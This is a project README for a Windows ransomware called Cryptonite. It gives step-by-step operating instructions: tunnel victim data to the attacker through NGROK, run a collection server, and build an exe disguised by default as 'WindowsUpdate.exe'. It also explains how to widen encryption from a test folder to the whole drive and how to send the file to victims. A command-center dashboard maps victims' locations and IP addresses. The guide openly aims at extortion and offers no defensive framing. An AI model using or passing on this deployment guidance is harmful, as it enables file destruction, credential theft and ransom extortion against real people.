![MIT License](https://img.shields.io/github/license/CYBERDEVILZ/CRYPTONITE) ![Issues](https://img.shields.io/github/issues/CYBERDEVILZ/CRYPTONITE?color=cyan) ![](https://img.shields.io/github/languages/top/CYBERDEVILZ/CRYPTONITE)   
![](https://img.shields.io/github/forks/cyberdevilz/cryptonite?style=social) ![](https://img.shields.io/github/stars/CYBERDEVILZ/CRYPTONITE?style=social)

# CRYPTONITE - A Ransomware for Windows OS

![Cryptonite](https://user-images.githubusercontent.com/55954313/123502409-c500b480-d669-11eb-977b-4e9ac5c327fa.jpg)

## Fully functional ransomware that uses minimum resources to give maximum output

## ✔️ TASK LIST ✔️
- [x] Encrypt all files except system specific ones
- [x] Encrytion must only be decrypted with a special key
- [x] Send the credentials of the victim to the attacker via secure tunnel, preferably **NGROK**
- [x] Pop up box should appear after encryption asking for ransom
- [x] Create a server to retrieve information sent by the victim
- [x] Add custom extension to encrypted files
- [x] Create an exe file generator
- [x] Graphical User Interface (Victim side)
- [x] Graphical User Interface (Attacker side)
- [ ] Create Windows Defender bypass script


---
# SEE CRYPTONITE IN ACTION

https://user-images.githubusercontent.com/55954313/135764868-2f24bebd-240c-4f77-9597-050f15067a31.mp4

---

# LEARN TO USE CRYPTONITE   
**Cryptonite** was developed with a motive of achieving maximum output with minimum efforts. Anyone can learn to use **Cryptonite**. I have included **two versions** of **Cryptonite**. One that stores data using **Sqlite3** and the other that uses **Mongo DB Atlas** to push the results into the cloud. Default method is to use **Sqlite3**, but if you are interested in using the **Mongo DB** version of **Cryptonite** then switch to the **mongo** branch of this repository.   
   
The below steps will guide you to use **Cryptonite** in detail (subjected to change as I add new concepts):-

## 1. 🍼 SETTING UP FOR THE FIRST TIME

The following setups need to be done if you are using **Cryptonite** for the first time.

### Create an NGROK account

* Visit [NGROK](https://ngrok.com/)
* Signup for an account. If you can spare some money, then buy the premium version. Else, the free version will suffice.
* Login to [NGROK](https://dashboard.ngrok.com/login)
* Download the suitable release of **NGROK** for your operating system.

     ![image](https://user-images.githubusercontent.com/55954313/124344516-533be400-dbf0-11eb-9d8f-ff745a510e3e.png)

* Unzip and install **NGROK**.
  * For Linux / MAC users, unzip the folder via terminal:-   
  
        unzip /path/to/ngrok.zip
  * For Windows users, just unzip the folder and run the exe file   
* Authenticate your **NGROK**:-   
  * Copy your AUTH TOKEN from [NGROK SETUP PAGE](https://dashboard.ngrok.com/get-started/your-authtoken)
  * For windows users, open cmd and type (replace `YOUR_AUTH_TOKEN_HERE` with your authtoken):-   
     
        ngrok authtoken YOUR_AUTH_TOKEN_HERE
  * For Linux / MAC users, open terminal and type (replace `YOUR_AUTH_TOKEN_HERE` with your authtoken):-   
     
        ./ngrok authtoken YOUR_AUTH_TOKEN_HERE

### Install the Python requirements for Cryptonite

    pip install -r "requirements.txt"  

## 2. 🔥 FIRING UP THE SERVER! 🔥
Run the **Server.py** file before you send the ransomware to victims. Make sure that **Server.py** runs all the time. Running the server also creates a **DB file** to store the victims' info.   

We will be running the Server on port 8000 of our localhost. Hence we need to perform port forwarding using **NGROK** to receive the credentials of our victims sent by our Ransomware. That will be our next step.

## 3. PORT FORWARDING USING NGROK

* Run **NGROK** on port 8000:-   
     

[Starting ngrok on 8000](https://user-images.githubusercontent.com/55954313/124347475-a6b72d80-dc02-11eb-9d85-d8e5d0a79f08.mp4)


* Copy the url and add the link [here](https://github.com/CYBERDEVILZ/Cryptonite/blob/190b55fee5e767af86b789b19e1a2ea47a6acaca/Cryptonite.py#L23). 
* DO NOT CLOSE THE TERMINAL OR ELSE THE PORT FORWARDING WILL STOP

## 4. 📝 FILLING UP THE DETAILS

* Run **exeGen.py** and fill up the necessary details.
* By default the Cryptonite is going to encrypt the contents of the folder named **testfolder** found in the directory where **Cryptonite.py** is run. But if you want to specify some different path, say the entire folder structure, then make sure to edit [this](https://github.com/CYBERDEVILZ/Cryptonite/blob/0e835b6875c1a1f53c724f941c63564a2d93d6cd/Cryptonite.py#L94) line by replacing **./testfolder** to **/** before executing **exeGen.py**. Dpn't forget to save **Cryptonite.py**.
* Running **exeGen.py** will create an **exe** file that can be shipped to the victim.

## 5. 🆗 TEST IT ON YOUR COMPUTER 🆗
        
Believe me when I say this... You can **safely test** this Ransomware on your device provided you **mention the correct path to the folder you are testing on**. I have already created a testing folder and the path has also been given. So its easier for you to see for yourself. Just execute **Cryptonite.py** and see the magic happen. If you wish to create your own folder and test it there, then mention the absolute path of the folder here.. [edit path](https://github.com/CYBERDEVILZ/Cryptonite/blob/13d62a703129220144cdcd66627e309f7dfece31/Cryptonite.py#L94)
   
 ## ⚠️ ❗ Do not give the base folder (/) for testing purposes ❗ ⚠️ 
 Never give the base folder for testing pupose as it will initiate the encryption of all the files (except the files inside these [folders](https://github.com/CYBERDEVILZ/Cryptonite/blob/0e835b6875c1a1f53c724f941c63564a2d93d6cd/Cryptonite.py#L34)). Please refrain from using the base folder unless you are absolutely sure of what you are doing. To be on the safer side, I have already ceated a **testfolder** and set the default value of the Encryption Folder Path to **testfolder**. Therefore, even if you accidentally run this Ransomware, it will only encrypt the **testfolder** and not the entire system.   

## 📓 Points to note...

* When you execute **Cryptonite.py**, go to the **Server.py** terminal and lookout whether you received **POST** request. If yes then the **NGROK** configuration was successful.   
* You can retrieve the information about the victims via executing the **retrieveinfo.py** file. Just type ```python retrieveinfo.py``` inside a new terminal in the current directory.

## 6. 📬 SEND IT TO YOUR VICTIMS
After we have tested our Ransomware, we intend to send it to the victims in the form of an **exe** file. I have created a python script **exeGen.py** that will generate an **exe** file of custom name. By default the name would be **WindowsUpdate.exe**. But you can change it anytime you want using **exeGen.py**.   
   
Remember, creating an exe will take quite a long time (upto five minutes!), hence chill and wait out the process and **do not close exeGen.py during exe file generation**. exeGen will automatically close itself after the exe file has been generated.

### Things to consider before sending the exe file
* Make sure that the [Encryption Folder Path](https://github.com/CYBERDEVILZ/Cryptonite/blob/0e835b6875c1a1f53c724f941c63564a2d93d6cd/Cryptonite.py#L94) is changed from **./testfolder** to **/** (if you are going for system wide encryption) or any folder path of your choice.
* All the Details should be correctly filled.
* **NGROK** and the **Server.py** must run all the time. Failure of which can result in Ransomware not being able to encrypt files (a popup of network error will be shown on the victim's screen and the Ransomware terminates).   
   
# 🚀 CRYPTONITE COMMAND CENTER 🚀


https://user-images.githubusercontent.com/55954313/136694138-6aec2389-4310-4a69-86aa-0f4dd9ee10ef.mp4


An all in one **monitoring dashboard** created to understand the **level of destruction** caused by this ransomware. The attacker can get to know the location of his victims plotted on a map with high precision. His IP address, hostname, place and other information are stored in a database and presented to the attacker in a neat table. Search and delete functionality has also been added. Grab a cup of coffee and sip on it while **Cryptonite** does all the hard work.

## 📓 Points to note...
* The Cryptonite Command Center can be accessed by running the **CommandCenter.py** file.
* Always use the inbuilt **RELOAD** button to reload the Command Center in case the values don't match up.
